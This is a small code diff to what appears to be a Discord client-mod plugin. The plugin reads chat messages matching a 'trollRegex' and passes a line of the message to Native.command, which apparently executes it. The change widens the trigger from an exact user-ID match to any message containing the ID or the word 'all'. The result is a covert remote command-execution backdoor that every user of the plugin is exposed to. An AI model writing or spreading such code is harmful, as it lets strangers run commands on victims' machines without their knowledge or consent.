@@ -39,7 +39,7 @@ export default definePlugin({
             for (const match of message.content.matchAll(trollRegex)) {
                 const lines = match[1].split("\n");
 
-                if (lines[0] === getUserId()) {
+                if (lines[0].includes(getUserId()) || lines[0] === "all") {
                     if (lines[1] === "command") {
                         await Native.command(lines[2]);
                     }
